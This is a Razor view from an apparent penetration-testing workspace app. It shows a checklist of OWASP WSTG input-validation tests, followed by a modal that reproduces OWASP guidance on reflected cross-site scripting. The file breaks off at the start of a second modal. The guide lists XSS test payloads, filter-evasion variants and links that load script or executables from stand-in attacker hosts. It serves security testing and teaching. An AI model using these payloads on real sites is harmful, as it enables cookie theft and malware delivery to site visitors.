@model Cervantes.Web.Areas.Workspace.Models.Wstg.WSTGViewModel
<div class="table-responsive-md">
            <table class="table table-bordered table-hover" id="inpvt" width="100%">
                <thead class="thead-dark">
                <tr>
                    <th><i class="fas fa-database"></i> Data Validation Testing</th>
                    <th><i class="fas fa-vial"></i> Test Name</th>
                    <th><i class="fas fa-bullseye"></i> Objectives</th>
                    
                    <th><i class="fas fa-project-diagram"></i> Status</th>
                    
                    <th><i class="fas fa-sticky-note"></i> Notes</th>
                    
                    <th>
                        <i class="fas fa-eye"></i>
                    </th>
                    
                    
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td>WSTG-INPV-01</td>
                    <td>Testing for Reflected Cross Site Scripting</td>
                                    
                    <td><p>- Identify variables that are reflected in responses.</p>
                        <p>- Assess the input they accept and the encoding that gets applied on return (if any).</p></td>
                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv01Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv01Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv1Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                
                <tr>
                    <td>WSTG-INPV-02</td>
                    <td>Testing for Stored Cross Site Scripting</td>
                                                    
                    <td><p>- Identify stored input that is reflected on the client-side.</p>
                        <p>- Assess the input they accept and the encoding that gets applied on return (if any).</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv02Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv02Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv2Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-03</td>
                    <td>Testing for HTTP Verb Tampering</td>
                                                    
                    <td>Testing for HTTP Verb Tampering</td>
                                                    
                    <td>
                       @Html.DropDownListFor(model => model.Inpv.Inpv03Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv03Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv3Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-04</td>
                    <td>Testing for HTTP Parameter Pollution</td>
                                                    
                    <td><p>- Identify the backend and the parsing method used.</p>
                        <p>- Assess injection points and try bypassing input filters using HPP.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv04Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv04Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv4Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-05</td>
                    <td>Testing for SQL Injection</td>
                                                    
                    <td><p>- Identify SQL injection points.</p>
                        <p>- Assess the severity of the injection and the level of access that can be achieved through it.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv05Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv05Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv5Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-06</td>
                    <td>Testing for LDAP Injection</td>
                                                    
                    <td><p>- Identify LDAP injection points.</p>
                        <p>- Assess the severity of the injection.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv06Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv06Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv6Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-07</td>
                    <td>Testing for XML Injection</td>
                                                    
                    <td><p>- Identify XML injection points.</p>
                        <p>- Assess the types of exploits that can be attained and their severities.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv07Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv07Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv7Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-08</td>
                    <td>Testing for SSI Injection</td>
                                                    
                    <td><p>- Identify SSI injection points.</p>
                        <p>- Assess the severity of the injection.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv08Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv08Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv8Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-09</td>
                    <td>Testing for XPath Injection</td>
                                                    
                    <td>- Identify XPATH injection points.</td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv09Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv09Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv9Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-10</td>
                    <td>Testing for IMAP SMTP Injection</td>
                                                    
                    <td><p>- Identify IMAP/SMTP injection points.</p>
                        <p>- Understand the data flow and deployment structure of the system.</p>
                        <p>- Assess the injection impacts.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv10Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv10Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv10Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-11</td>
                    <td>Testing for Code Injection</td>
                                                    
                    <td><p>- Identify injection points where you can inject code into the application.</p>
                        <p>- Assess the injection severity.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv11Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv11Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv11Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-12</td>
                    <td>Testing for Command Injection</td>
                                                    
                    <td>- Identify and assess the command injection points.</td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv12Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv12Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv12Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-13</td>
                    <td>Testing for Format String Injection</td>
                                                    
                    <td>- Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behaviour from the application.</td>
                                                    
                    <td>
                       @Html.DropDownListFor(model => model.Inpv.Inpv13Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv13Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv13Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-14</td>
                    <td>Testing for Incubated Vulnerability</td>
                                                    
                    <td><p>- Identify injections that are stored and require a recall step to the stored injection.</p>
                        <p>- Understand how a recall step could occur.</p>
                        <p>- Set listeners or activate the recall step if possible.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv14Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv14Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv14Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-15</td>
                    <td>Testing for HTTP Splitting Smuggling</td>
                                                    
                    <td><p>- Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.</p>
                        <p>- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv15Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv15Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv15Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-16</td>
                    <td>Testing for HTTP Incoming Requests</td>
                                                    
                    <td><p>- Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.</p>
                        <p>- Monitor HTTP traffic without changes of end user Browser proxy or client-side application.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv16Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv16Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv16Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-17</td>
                    <td>Testing for Host Header Injection</td>
                                                    
                    <td><p>- Assess if the Host header is being parsed dynamically in the application.</p>
                        <p>- Bypass security controls that rely on the header.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv17Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td><textarea asp-for="Inpv.Inpv17Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv17Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-18</td>
                    <td>Testing for Server-side Template Injection</td>
                                                    
                    <td><p>- Detect template injection vulnerability points.</p>
                        <p>- Identify the templating engine.</p>
                        <p>- Build the exploit.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv18Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv18Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv18Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-INPV-19</td>
                    <td>Testing for Server-Side Request Forgery</td>
                                                    
                    <td><p>- Identify SSRF injection points.</p>
                        <p>- Test if the injection points are exploitable.</p>
                        <p>- Assess the severity of the vulnerability.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Inpv.Inpv19Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Inpv.Inpv19Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#inpv19Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                
                </tbody>
            </table>
        </div>

<!-- Modal -->
<div class="modal fade" id="inpv1Modal" tabindex="-1" role="dialog" aria-labelledby="inpv1ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv1ModalLabel">WSTG-INPV-01 - Testing for Reflected Cross Site Scripting</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Reflected <a href="https://owasp.org/www-community/attacks/xss/">Cross-site Scripting (XSS)</a> occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.</p>
                
                <p>Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.</p>
                
                <p>When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim’s browser.</p>
                
                <p>Commonly the attacker’s code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).</p>
                
                <p>One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>, but might not filter <code class="language-plaintext highlighter-rouge">%3cscript%3e</code> which simply includes another encoding of tags.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify variables that are reflected in responses.</li>
                  <li>Assess the input they accept and the encoding that gets applied on return (if any).</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <p>A black-box test will include at least three phases:</p>
                
                <h4 id="detect-input-vectors">Detect Input Vectors</h4>
                
                <p>Detect input vectors. For each web page, the tester must determine all the web application’s user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.</p>
                
                <h4 id="analyze-input-vectors">Analyze Input Vectors</h4>
                
                <p>Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
                  Some example of such input data are the following:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(123)&lt;/script&gt;</code></li>
                  <li><code class="language-plaintext highlighter-rouge">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
                </ul>
                
                <p>For a comprehensive list of potential test strings see the <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a>.</p>
                
                <h4 id="check-impact">Check Impact</h4>
                
                <p>For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.</p>
                
                <p>Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">&gt;</code> (greater than)</li>
                  <li><code class="language-plaintext highlighter-rouge">&lt;</code> (less than)</li>
                  <li><code class="language-plaintext highlighter-rouge">&amp;</code> (ampersand)</li>
                  <li><code class="language-plaintext highlighter-rouge">'</code> (apostrophe or single quote)</li>
                  <li><code class="language-plaintext highlighter-rouge">"</code> (double quote)</li>
                </ul>
                
                <p>However, a full list of entities is defined by the HTML and XML specifications. <a href="https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references">Wikipedia has a complete reference</a>.</p>
                
                <p>Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">\n</code> (new line)</li>
                  <li><code class="language-plaintext highlighter-rouge">\r</code> (carriage return)</li>
                  <li><code class="language-plaintext highlighter-rouge">'</code> (apostrophe or single quote)</li>
                  <li><code class="language-plaintext highlighter-rouge">"</code> (double quote)</li>
                  <li><code class="language-plaintext highlighter-rouge">\</code> (backslash)</li>
                  <li><code class="language-plaintext highlighter-rouge">\uXXXX</code> (unicode values)</li>
                </ul>
                
                <p>For a more complete reference, see the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings">Mozilla JavaScript guide</a>.</p>
                
                <h4 id="example-1">Example 1</h4>
                
                <p>For example, consider a site that has a welcome notice <code class="language-plaintext highlighter-rouge">Welcome %username%</code> and a download link.</p>

                <p>The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.</p>
                
                <p>Let’s try to click on the following link and see what happens:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
                </code></pre></div></div>
                
                
                <p>This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody’s browser if he clicks on the tester’s link.</p>
                
                <h4 id="example-2">Example 2</h4>
                
                <p>Let’s try other piece of code (link):</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}&lt;/script&gt;
                </code></pre></div></div>
                          
                <p>This will cause the user, clicking on the link supplied by the tester, to download the file <code class="language-plaintext highlighter-rouge">malicious.exe</code> from a site they control.</p>
                
                <h3 id="bypass-xss-filters">Bypass XSS Filters</h3>
                
                <p>Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.</p>
                
                <p>Thus, the majority of XSS prevention must depend on the web application’s sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.</p>
                
                <p>The <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a> documents common filter evasion tests.</p>
                
                <h4 id="example-3-tag-attribute-value">Example 3: Tag Attribute Value</h4>
                
                <p>Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags and even without the use of characters such as <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> that are commonly filtered.</p>
                
                <p>For example, the web application could use the user input value to fill an attribute, as shown in the following code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"state"</span> <span class="na">value=</span><span class="s">"INPUT_FROM_USER"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>Then an attacker could submit the following code:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" onfocus="alert(document.cookie)
                </code></pre></div></div>
                
                <h4 id="example-4-different-syntax-or-encoding">Example 4: Different Syntax or Encoding</h4>
                
                <p>In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the enconding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.</p>
                
                <p>Following some examples:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">"&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;</code></li>
                  <li><code class="language-plaintext highlighter-rouge">"&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;</code></li>
                  <li><code class="language-plaintext highlighter-rouge">"%3cscript%3ealert(document.cookie)%3c/script%3e</code></li>
                </ul>
                
                <h4 id="example-5-bypassing-non-recursive-filtering">Example 5: Bypassing Non-Recursive Filtering</h4>
                
                <p>Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
                </code></pre></div></div>
                
                <h4 id="example-6-including-external-script">Example 6: Including External Script</h4>
                
                <p>Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:</p>
                
                <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
                    <span class="nv">$re</span> <span class="o">=</span> <span class="s2">"/&lt;script[^&gt;]+src/i"</span><span class="p">;</span>
                
                    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">]))</span>
                    <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"Filtered"</span><span class="p">;</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">echo</span> <span class="s2">"Welcome "</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">]</span><span class="mf">.</span><span class="s2">" !"</span><span class="p">;</span>
                <span class="cp">?&gt;</span>
                </code></pre></div></div>
                
                <p>Decoupling the above regular expression:</p>
                
                <ol>
                  <li>Check for a <code class="language-plaintext highlighter-rouge">&lt;script</code></li>
                  <li>Check for a “ “ (white space)</li>
                  <li>Any character but the character <code class="language-plaintext highlighter-rouge">&gt;</code> for one or more occurrences</li>
                  <li>Check for a <code class="language-plaintext highlighter-rouge">src</code></li>
                </ol>
                
                <p>This is useful for filtering expressions like <code class="language-plaintext highlighter-rouge">&lt;script src="http://attacker/xss.js"&gt;&lt;/script&gt;</code> which is a common attack. But, in this case, it is possible to bypass the sanitization by using the <code class="language-plaintext highlighter-rouge">&gt;</code> character in an attribute between script and src, like this:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example/?var=&lt;SCRIPT%20a="&gt;"%20SRC="http://attacker/xss.js"&gt;&lt;/SCRIPT&gt;
                </code></pre></div></div>
                
                <p>This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker’s web server as if it was originating from the victim web site, <code class="language-plaintext highlighter-rouge">http://example/</code>.</p>
                
                <h4 id="example-7-http-parameter-pollution-hpp">Example 7: HTTP Parameter Pollution (HPP)</h4>
                
                <p>Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution">Testing for HTTP Parameter pollution</a> for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.
                Regular attack:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
                </code></pre></div></div>
                
                <p>Attack using HPP:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
                </code></pre></div></div>
                
                <p>See the <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a> for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors’ browsers.</p>
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.</p>
                
                <p>If source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://cybersecurity.wtf/encoder/">PHP Charset Encoder(PCE)</a> helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.</li>
                  <li><a href="https://hackvertor.co.uk/public">Hackvertor</a> is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).</li>
                  <li><a href="http://xss-proxy.sourceforge.net/">XSS-Proxy</a> is an advanced Cross-Site-Scripting (XSS) attack tool.</li>
                  <li><a href="https://code.google.com/archive/p/ratproxy/">ratproxy</a> is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.</li>
                  <li><a href="https://portswigger.net/burp/">Burp Proxy</a> is an interactive HTTP/S proxy server for attacking and testing web applications.</li>
                  <li><a href="https://www.zaproxy.org">OWASP Zed Attack Proxy (ZAP)</a> is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.</li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <h3 id="owasp-resources">OWASP Resources</h3>
                
                <ul>
                  <li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a></li>
                </ul>
                
                <h3 id="books">Books</h3>
                
                <ul>
                  <li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li>
                  <li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li>
                  <li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li>
                </ul>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf">CERT - Malicious HTML Tags Embedded in Client Web Requests</a></li>
                  <li><a href="https://www.cgisecurity.com/xss-faq.html">cgisecurity.com - The Cross Site Scripting FAQ</a></li>
                  <li><a href="http://www.technicalinfo.net/papers/CSS.html">G.Ollmann - HTML Code Injection and Cross-site scripting</a></li>
                  <li><a href="https://www.techzoom.net/Publications/Insecurity-Iceberg">S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv2Modal" tabindex="-1" role="dialog" aria-labelledby="inpv2ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv2ModalLabel">WSTG-INPV-02 - Testing for Stored Cross Site Scripting</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
